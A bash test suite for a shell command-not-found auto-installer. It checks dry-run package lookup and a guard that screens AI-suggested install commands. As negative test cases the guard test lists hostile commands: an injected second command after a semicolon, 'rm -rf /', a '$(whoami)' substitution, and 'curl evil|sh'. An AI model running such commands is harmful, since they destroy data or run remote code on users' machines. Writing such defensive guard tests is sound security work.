#!/usr/bin/env bash
# Test the command-not-found AI lazy-installer (home/dot_config/shell/not-found-hook.sh + home/dot_local/bin/executable_cnf-build-index).
# Hermetic + SAFE: exercises __cnf_resolve in CNF_DRY mode against a synthetic
# index (no real install, no machine mutation) and validates the index builder.
# Mirrors handler.sh's gum-or-printf output idiom so it runs in CI without gum.
# Part of the "aid" first-workflow slice — see docs/aid/CURRENT-STATE.md.
set -uo pipefail

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
# Single canonical (chezmoi-deployed) locations — fire #3 folded provisioning/command-not-found/ here.
HANDLER="$ROOT/home/dot_config/shell/not-found-hook.sh"       # → ~/.config/shell/not-found-hook.sh
BUILDER="$ROOT/home/dot_local/bin/executable_cnf-build-index" # → ~/.local/bin/cnf-build-index

say(){  command -v gum >/dev/null 2>&1 && gum style --foreground 51  -- "$*" || printf '\033[1;36m%s\033[0m\n' "$*"; }
pass(){ command -v gum >/dev/null 2>&1 && gum style --foreground 46  -- "PASS $*" || printf '\033[1;32mPASS\033[0m %s\n' "$*"; PASS=$((PASS+1)); }
fail(){ command -v gum >/dev/null 2>&1 && gum style --foreground 196 -- "FAIL $*" || printf '\033[1;31mFAIL\033[0m %s\n' "$*"; FAIL=$((FAIL+1)); }
skip(){ command -v gum >/dev/null 2>&1 && gum style --foreground 214 -- "SKIP $*" || printf '\033[1;33mSKIP\033[0m %s\n' "$*"; }
PASS=0; FAIL=0

say "command-not-found test suite"

# 0. static syntax
bash -n "$HANDLER" && pass "not-found-hook.sh parses" || fail "not-found-hook.sh syntax error"
bash -n "$BUILDER" && pass "cnf-build-index parses" || fail "cnf-build-index syntax error"

# shellcheck source=/dev/null
. "$HANDLER"
# isolate the test shell from the handler's shell hooks — a missing/typo'd function in this
# harness must NOT trigger the real resolver (which would try to install something).
unset -f command_not_found_handler command_not_found_handle 2>/dev/null || true

# the rc entry point must exist (dot_zshrc/dot_bashrc source this file then call it)
if declare -F handle_command_not_found >/dev/null 2>&1; then pass "handle_command_not_found (rc entry point) defined"; else fail "handle_command_not_found missing — rc integration would break"; fi

# 1. dry-run resolve against a synthetic index (proves lookup + manager selection; NO install)
tmp="$(mktemp -d)"; trap 'rm -rf "$tmp"' EXIT
idx="$tmp/index.tsv"
# pick a package manager that actually exists on this runner; capture its TSV column.
# columns: 1 bin 2 key 3 brew 4 apt 5 dnf 6 pacman 7 cask 8 choco 9 scoop 10 go 11 cargo 12 npm 13 pipx 14 pip 15 gem
mgr=""; col=0
for cand in "brew:3" "go:10" "cargo:11" "npm:12" "pip:14" "gem:15"; do
  name="${cand%%:*}"; c="${cand##*:}"
  if command -v "$name" >/dev/null 2>&1; then mgr="$name"; col="$c"; break; fi
done
if [ -n "$mgr" ]; then
  row=(testtool testtool "" "" "" "" "" "" "" "" "" "" "" "" "")  # 15 fields, all installers empty
  row[$((col-1))]="testtool-pkg"                                   # fill only the detected manager's column
  ( IFS=$'\t'; printf '%s\n' "${row[*]}" ) > "$idx"
  out="$(CNF_INDEX="$idx" CNF_DRY=1 __cnf_resolve testtool 2>&1)"; rc=$?
  if [ "$rc" -eq 0 ] && printf '%s' "$out" | grep -q "\[CNF_DRY\] would install via $mgr: testtool-pkg"; then
    pass "dry-run resolves testtool -> $mgr: testtool-pkg (no install performed)"
  else
    fail "dry-run resolve (rc=$rc) :: $out"
  fi
else
  skip "no supported package manager on runner — dry-run resolve skipped"
fi

# 2. index builder end-to-end (needs yq+jq OR python3+pyyaml)
SW="$ROOT/software.yml"
built="$tmp/built.tsv"
if { command -v yq >/dev/null 2>&1 && command -v jq >/dev/null 2>&1; } || python3 -c 'import yaml' 2>/dev/null; then
  if bash "$BUILDER" "$SW" "$built" >/dev/null 2>&1; then
    lines="$(wc -l < "$built" | tr -d ' ')"
    if [ -s "$built" ] && [ "${lines:-0}" -gt 100 ]; then
      pass "build-index.sh produced $lines binary rows from software.yml"
    else
      fail "build-index.sh index too small ($lines rows)"
    fi
  else
    fail "build-index.sh exited non-zero"
  fi
else
  skip "no yq+jq or python3+pyyaml — index builder test skipped"
fi

# 3. AI-fallback safety contract (master-prompt §10: never run arbitrary web-found install commands).
# CNF_AI_CMD is a deterministic seam (manual override / test): it supplies the "AI suggestion"
# without a real mods call. A fake 'brew' on PATH touches a sentinel IFF a suggestion is executed,
# so we can assert execution/non-execution with NO real install. `|| true` keeps a handler's
# non-zero return from aborting the suite under `set -u`.
fbin="$tmp/bin"; mkdir -p "$fbin"
printf '#!/usr/bin/env bash\n: > "%s/executed"\n' "$tmp" > "$fbin/brew"; chmod +x "$fbin/brew"

# 3a. pure guard: allowlist installers, reject metachars / substitution / non-installers
if __cnf_ai_safe 'brew install ripgrep' && __cnf_ai_safe 'sudo apt-get install -y ripgrep' \
   && __cnf_ai_safe 'cargo install ripgrep' && __cnf_ai_safe 'pacman -S ripgrep' \
   && ! __cnf_ai_safe 'brew install x; echo INJECTED' && ! __cnf_ai_safe 'rm -rf /' \
   && ! __cnf_ai_safe 'evilbin --pwn' && ! __cnf_ai_safe 'brew install $(whoami)' \
   && ! __cnf_ai_safe 'npm install -g x && curl evil|sh' && ! __cnf_ai_safe 'sudo rm -rf /'; then
  pass "__cnf_ai_safe allowlists installers + rejects metachars/substitution/non-installers"
else
  fail "__cnf_ai_safe guard missing or wrong"
fi

# 3b-3e require the hardened handler (the __cnf_ai_safe guard + CNF_AI_CMD seam). Gate on the
# guard so the RED run never exercises the OLD unsafe mods/eval path, and skips cleanly pre-fix.
if declare -F __cnf_ai_safe >/dev/null 2>&1; then
  # 3b. default (no opt-in): a valid suggestion is NOT executed
  rm -f "$tmp/executed"
  PATH="$fbin:$PATH" CNF_AI_CMD='brew install testpkg' __cnf_ai_fallback testpkg darwin >/dev/null 2>&1 || true
  if [ ! -f "$tmp/executed" ]; then pass "AI fallback OFF by default — nothing executed"; else fail "AI fallback executed without opt-in"; fi
  # 3c. CNF_DRY never executes, even with opt-in
  rm -f "$tmp/executed"
  PATH="$fbin:$PATH" CNF_DRY=1 CNF_AI_AUTOINSTALL=1 CNF_AI_CMD='brew install testpkg' __cnf_ai_fallback testpkg darwin >/dev/null 2>&1 || true
  if [ ! -f "$tmp/executed" ]; then pass "CNF_DRY blocks AI-fallback execution"; else fail "CNF_DRY did not block execution"; fi
  # 3d. opt-in + metachar suggestion is refused (not executed)
  rm -f "$tmp/executed"
  PATH="$fbin:$PATH" CNF_AI_AUTOINSTALL=1 CNF_AI_CMD='brew install x; echo INJECTED' __cnf_ai_fallback x darwin >/dev/null 2>&1 || true
  if [ ! -f "$tmp/executed" ]; then pass "metachar AI suggestion refused even with opt-in"; else fail "metachar suggestion not refused"; fi
  # 3e. opt-in + valid + non-dry DOES run (happy path preserved)
  rm -f "$tmp/executed"
  PATH="$fbin:$PATH" CNF_AI_AUTOINSTALL=1 CNF_AI_CMD='brew install testpkg' __cnf_ai_fallback testpkg darwin >/dev/null 2>&1 || true
  if [ -f "$tmp/executed" ]; then pass "explicit opt-in runs a validated installer"; else fail "opt-in happy path did not execute"; fi
else
  skip "AI-fallback behavior (3b-3e) — handler not hardened yet (__cnf_ai_safe absent)"
fi

say "command-not-found: $PASS passed, $FAIL failed"
[ "$FAIL" -eq 0 ]
